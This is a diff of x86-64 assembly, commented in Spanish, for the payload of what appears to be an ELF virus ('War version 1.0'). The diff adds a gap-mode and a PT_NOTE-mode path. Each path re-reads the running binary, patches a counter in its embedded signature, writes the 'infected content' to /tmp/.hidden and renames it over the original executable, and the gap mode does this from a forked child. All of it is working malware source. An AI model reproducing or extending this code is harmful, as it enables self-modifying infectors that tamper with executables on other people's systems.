@@ -5,10 +5,11 @@ _ft_payload:
     jmp     code_start
 
 data_start:
-entry_delta:    dq 0xDEADBEEF               ; offset 2
-sig_offset:     dq 0xDEADBEEF               ; offset 10
-path_self:      db "/proc/self/exe", 0      ; offset 18
-path_temporal:  db "/tmp/.hidden", 0        ; offset 33
+entry_delta:    dq 0xDEADBEEF               ; offset 2  (EP_orig - new_vaddr)
+sig_offset:     dq 0xDEADBEEF               ; offset 10 (offset de la firma en el fichero)
+use_gap_flag:   dq 0xDEADBEEF               ; offset 18 (1 = hueco, 0 = PT_NOTE)
+path_self:      db "/proc/self/exe", 0      ; offset 26
+path_temporal:  db "/tmp/.hidden", 0        ; offset 41
 
 code_start:
     push    rbx
@@ -22,7 +23,7 @@ code_start:
     call    .get_base
 .get_base:
     pop     rbx
-    sub     rbx, (.get_base - _ft_payload)
+    sub     rbx, (.get_base - _ft_payload)  ; rbx = base real del payload
 
     sub     rsp, 1056
 
@@ -36,62 +37,71 @@ code_start:
     jl      .restore_stack
     mov     byte [rsp + rax], 0
 
-    ; 2. open original binary
-    mov     rax, 2
-    mov     rdi, rsp
-    xor     rsi, rsi
-    xor     rdx, rdx
+    ; 2. Comprobar si estamos en el hueco o en el PT_NOTE
+    mov     rax, [rbx + 18]             ; use_gap_flag
+    cmp     rax, 1
+    je      .gap_mode
+    jmp     .note_mode
+
+.gap_mode:
+    ; === MODO HUECO: fork + hijo hace open(O_RDONLY) + mmap(MAP_PRIVATE) + archivo temporal + rename ===
+    mov     rax, 57
     syscall
     cmp     rax, 0
     jl      .restore_stack
-    mov     r14, rax
+    jnz     .restore_stack          ; padre → _start original
 
-    ; 3. lseek to get file size
+    ; === HIJO ===
+    ; 1. open(path, O_RDONLY) -> Evita ETXTBSY
+    mov     rax, 2
+    mov     rdi, rsp
+    xor     rsi, rsi                ; O_RDONLY
+    xor     rdx, rdx
+    syscall
+    cmp     rax, 0
+    jl      .gap_child_exit
+    mov     r14, rax                ; r14 = fd original
+
+    ; 2. lseek(fd, 0, SEEK_END) → file_size
     mov     rax, 8
     mov     rdi, r14
     xor     rsi, rsi
     mov     rdx, 2
     syscall
-    mov     r15, rax
+    mov     r15, rax                ; r15 = file_size
 
-    ; 4. mmap original binary
+    ; 3. mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0)
     mov     rax, 9
     xor     rdi, rdi
     mov     rsi, r15
-    mov     rdx, 3
-    mov     r10, 2
+    mov     rdx, 3                  ; PROT_READ | PROT_WRITE
+    mov     r10, 2                  ; MAP_PRIVATE
     mov     r8, r14
     xor     r9, r9
     syscall
     cmp     rax, -1
-    je      .close_orig
-    mov     r13, rax
+    je      .gap_child_close
+    mov     r13, rax                ; r13 = mmap address
 
-    ; 5. Ir al inicio de la firma (sig_offset)
-    mov     rdi, [rbx + 10]             ; rdi = sig_offset
-    add     rdi, r13                    ; rdi = dirección en el mapeo
+    ; 4. Modificar el contador de 7 dígitos al final de la firma
+    mov     rdi, [rbx + 10]         ; sig_offset
+    add     rdi, r13                ; mmap + sig_offset
 
-    ; 6. Buscar el ÚLTIMO guion '-' de la firma (el de "davgalle - 39775")
-    ;    La firma mide 50 bytes: "War version 1.0 (c)oded Oct - 2026 by davgalle - 39775"
-    ;    Buscamos desde el final hacia atrás hasta encontrar el guion.
-    lea     rdx, [rdi + 50]             ; rdx = final de la firma (aprox)
-    mov     rcx, 60                     ; máximo 60 bytes hacia atrás
-.find_last_dash:
-    dec     rdx
+    ; Buscar el último guion '-' hacia atrás
+    lea     rdx, [rdi + 50]
+    mov     rcx, 60
+.find_dash:
     cmp     byte [rdx], '-'
-    je      .found_last_dash
-    loop    .find_last_dash
-    jmp     .munmap_buf                 ; no encontrado, abortar
+    je      .found_dash
+    dec     rdx
+    loop    .find_dash
+    jmp     .gap_munmap
 
-.found_last_dash:
-    ; rdx apunta al guion de "davgalle - 39775"
-    ; avanzar 2 bytes: " - " → '3' de 39775
-    add     rdx, 2
-
-    ; 7. Leer el número de 5 dígitos (39775)
+.found_dash:
+    add     rdx, 2                  ; apunta al primer dígito del contador
     push    rdx
     xor     r12, r12
-    mov     rcx, 5
+    mov     rcx, 7                  ; 7 dígitos
 .conv_num:
     movzx   eax, byte [rdx]
     sub     eax, '0'
@@ -100,13 +110,12 @@ code_start:
     inc     rdx
     loop    .conv_num
 
-    inc     r12                         ; incrementar el contador
+    inc     r12                     ; Incrementar contador
 
-    ; 8. Escribir el nuevo número de 5 dígitos
-    pop     rdi                         ; rdi = inicio del número (primer '3')
-    add     rdi, 4                      ; apuntar al último dígito
+    pop     rdi
+    add     rdi, 6                  ; apuntar al último dígito
     mov     rax, r12
-    mov     rcx, 5
+    mov     rcx, 7
 .conv_str:
     xor     rdx, rdx
     mov     r8, 10
@@ -116,55 +125,170 @@ code_start:
     dec     rdi
     loop    .conv_str
 
-    ; 9. open temporal file
+    ; 5. open archivo temporal (/tmp/.hidden)
     mov     rax, 2
     lea     rdi, [rbx + (path_temporal - _ft_payload)]
-    mov     rsi, 0x241
-    mov     rdx, 0x1ed
+    mov     rsi, 0x241              ; O_WRONLY|O_CREAT|O_TRUNC
+    mov     rdx, 0x1ed              ; 0755
     syscall
     cmp     rax, 0
-    jl      .munmap_buf
-    mov     r12, rax
+    jl      .gap_munmap
+    mov     r12, rax                ; r12 = fd temporal
 
-    ; 10. write infected content to temporal file
+    ; 6. write contenido modificado al temporal
     mov     rax, 1
     mov     rdi, r12
     mov     rsi, r13
     mov     rdx, r15
     syscall
 
-    ; 11. fsync
-    mov     rax, 74
-    mov     rdi, r12
-    syscall
-
-    ; 12. close temporal file
+    ; 7. close temporal
     mov     rax, 3
     mov     rdi, r12
     syscall
 
-    ; 13. chmod temporal file
-    mov     rax, 90
-    lea     rdi, [rbx + (path_temporal - _ft_payload)]
-    mov     rsi, 0x1ed
-    syscall
-
-.munmap_buf:
+.gap_munmap:
+    ; 8. munmap
     mov     rax, 11
     mov     rdi, r13
     mov     rsi, r15
     syscall
 
-.close_orig:
+.gap_child_close:
+    ; 9. close original
     mov     rax, 3
     mov     rdi, r14
     syscall
 
-    ; 14. rename temporal file over original path
+    ; 10. rename temporal sobre el path original
     mov     rax, 82
     lea     rdi, [rbx + (path_temporal - _ft_payload)]
     mov     rsi, rsp
     syscall
+
+.gap_child_exit:
+    mov     rax, 60
+    xor     rdi, rdi
+    syscall
+
+.note_mode:
+    ; === MODO PT_NOTE: mmap MAP_PRIVATE + escribir a /tmp/.hidden + rename (como antes) ===
+
+    ; open(path, O_RDONLY)
+    mov     rax, 2
+    mov     rdi, rsp
+    xor     rsi, rsi                ; O_RDONLY
+    xor     rdx, rdx
+    syscall
+    cmp     rax, 0
+    jl      .restore_stack
+    mov     r14, rax                ; r14 = fd
+
+    ; lseek(fd, 0, SEEK_END) → file_size
+    mov     rax, 8
+    mov     rdi, r14
+    xor     rsi, rsi
+    mov     rdx, 2
+    syscall
+    mov     r15, rax                ; r15 = file_size
+
+    ; mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0)
+    mov     rax, 9
+    xor     rdi, rdi
+    mov     rsi, r15
+    mov     rdx, 3                  ; PROT_READ | PROT_WRITE
+    mov     r10, 2                  ; MAP_PRIVATE
+    mov     r8, r14
+    xor     r9, r9
+    syscall
+    cmp     rax, -1
+    je      .note_close
+    mov     r13, rax                ; r13 = mmap address
+
+    ; Modificar el fingerprint en el mapeo
+    mov     rdi, [rbx + 10]         ; sig_offset
+    add     rdi, r13                ; mmap + sig_offset
+    add     rdi, 30                 ; apuntar al '2' de 2026 (o al primer dígito)
+
+    push    rdi
+    xor     r12, r12
+    mov     rcx, 4
+.note_conv_num:
+    movzx   eax, byte [rdi]
+    sub     eax, '0'
+    imul    r12, r12, 10
+    add     r12, rax
+    inc     rdi
+    loop    .note_conv_num
+
+    inc     r12
+
+    pop     rdi
+    add     rdi, 3
+    mov     rax, r12
+    mov     rcx, 4
+.note_conv_str:
+    xor     rdx, rdx
+    mov     r8, 10
+    div     r8
+    add     dl, '0'
+    mov     [rdi], dl
+    dec     rdi
+    loop    .note_conv_str
+
+    ; open temporal file
+    mov     rax, 2
+    lea     rdi, [rbx + (path_temporal - _ft_payload)]
+    mov     rsi, 0x241              ; O_WRONLY|O_CREAT|O_TRUNC
+    mov     rdx, 0x1ed              ; 0755
+    syscall
+    cmp     rax, 0
+    jl      .note_munmap
+    mov     r12, rax
+
+    ; write infected content to temporal file
+    mov     rax, 1
+    mov     rdi, r12
+    mov     rsi, r13
+    mov     rdx, r15
+    syscall
+
+    ; fsync
+    mov     rax, 74
+    mov     rdi, r12
+    syscall
+
+    ; close temporal file
+    mov     rax, 3
+    mov     rdi, r12
+    syscall
+
+    ; chmod temporal file
+    mov     rax, 90
+    lea     rdi, [rbx + (path_temporal - _ft_payload)]
+    mov     rsi, 0x1ed
+    syscall
+
+.note_munmap:
+    ; munmap(mmap, size)
+    mov     rax, 11
+    mov     rdi, r13
+    mov     rsi, r15
+    syscall
+
+.note_close:
+    ; close(fd)
+    mov     rax, 3
+    mov     rdi, r14
+    syscall
+
+    ; rename temporal file over original path
+    mov     rax, 82
+    lea     rdi, [rbx + (path_temporal - _ft_payload)]
+    mov     rsi, rsp
+    syscall
+
+    jmp     .restore_stack
 
 .restore_stack:
     add     rsp, 1056
